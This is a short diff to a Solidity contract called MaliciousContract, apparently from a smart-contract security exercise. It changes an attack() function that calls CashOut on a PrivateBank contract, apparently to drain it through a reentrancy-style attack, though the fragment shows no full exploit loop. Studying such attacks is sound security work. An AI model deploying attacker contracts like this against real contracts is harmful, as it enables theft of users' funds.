@@ -10,9 +10,9 @@ contract MaliciousContract{
         privateBank= PrivateBank (_privateBank);
     }
 
-    function attack() public payable{
-        require(msg.value >= 1 ether, "Must send at least 1 ether");
-        privateBank.CashOut(msg.value);
+   function attack(uint amount) public {
+        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
+        privateBank.CashOut(amount);
     }
 
     function deposit()  public payable{
